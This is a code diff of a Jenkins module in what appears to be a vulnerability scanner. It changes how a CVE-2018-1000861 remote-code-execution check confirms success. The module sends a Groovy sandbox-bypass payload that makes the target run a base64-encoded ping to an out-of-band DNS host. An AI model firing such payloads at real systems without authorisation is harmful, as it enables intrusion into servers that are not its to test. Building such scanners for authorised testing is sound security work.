@@ -1,29 +1,27 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import base64
-import requests
+from thirdparty import requests
 import threading
 import urllib
 from module import globals
 from core.verify import verify
 from module.md5 import random_md5
 from urllib.parse import urlparse
-from requests.packages import urllib3
-from requests_toolbelt.utils import dump
-urllib3.disable_warnings()
+from thirdparty.requests_toolbelt.utils import dump
+from module.api.dns import dns_result, dns_request
 
 
 class Jenkins():
     def __init__(self, url):
         self.url = url
+        if self.url[-1] == "/":
+            self.url = self.url[:-1]
         self.raw_data = None
         self.vul_info = {}
         self.ua = globals.get_value("UA")  # 获取全局变量UA
         self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
         self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
-        self.ceye_domain = globals.get_value("ceye_domain")
-        self.ceye_token = globals.get_value("ceye_token")
-        self.ceye_api = globals.get_value("ceye_api")
         self.threadLock = threading.Lock()
         self.payload_cve_2018_1000861 = '/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.' \
                                         'scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public+class+' \
@@ -120,18 +118,18 @@ class Jenkins():
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["prt_info"] = "[rce] [url: " + self.url + "/robots.txt ] "
             else:
-                self.c_echo = "ping " + md + "." + self.ceye_domain
+                md = dns_request()
+                self.c_echo = "ping " + md
                 self.c_base = base64.b64encode(str.encode(self.c_echo))
                 self.c_cmd = self.c_base.decode('ascii')
                 self.cmd = urllib.parse.quote(self.c_cmd)
                 self.payload = self.payload_cve_2018_1000861.replace("RECOMMAND", self.cmd)
                 self.req = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout,
                                             verify=False)
-                ceye = requests.get(self.ceye_api + self.ceye_token)
-                if md in ceye.text:
+                if dns_result(md):
                     self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                     self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                    self.vul_info["prt_info"] = "[ceye] [cmd: " + self.c_echo + "]"
+                    self.vul_info["prt_info"] = "[dns] [cmd: " + self.c_echo + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
